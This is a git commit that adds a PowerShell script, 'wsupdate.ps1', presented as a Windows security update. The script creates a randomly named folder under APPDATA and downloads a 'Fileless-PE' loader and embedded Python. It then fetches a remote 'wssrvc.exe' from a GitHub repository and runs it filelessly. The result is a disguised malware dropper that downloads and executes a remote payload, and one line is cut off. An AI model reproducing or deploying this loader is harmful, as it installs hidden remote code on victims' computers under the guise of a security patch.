f49c08f9bacff5acc3dc90f3d5d87030bea91656
xxoo-d <im4x5yn74x@kaiju-security.com>
2025-10-20 13:51:28 -0400

    Add files via upload

---
+++ wsupdate.ps1
@@ -0,0 +1,11 @@
+$Length = 10
+$Characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
+$RandomString = -join ($Characters.ToCharArray() | Get-Random -Count $Length)
+$FolderName = "$RandomString"
+Write-Host "Random folder name (string): $FolderName"
+wget https://github.com/malwarekid/Fileless-PE/archive/refs/heads/main.zip -O $env:APPDATA\main.zip
+Expand-Archive -Path $env:APPDATA\main.zip -DestinationPath $env:APPDATA\$FolderName
+wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
+Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\Fileless-PE-main\
+"https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/wssrvc.exe`nexe`n$env:APPDATA\\$FolderName\\Fileless-PE-main\\wssrvc.py`n" | & "$env:APPDATA\\$FolderName\\Fileless-PE-main\\python.exe" @("$env:APPDATA\\$FolderNa>
+& "$env:APPDATA\\$FolderName\\Fileless-PE-main\\python.exe" @("$env:APPDATA\$FolderName\Fileless-PE-main\wssrvc.py")
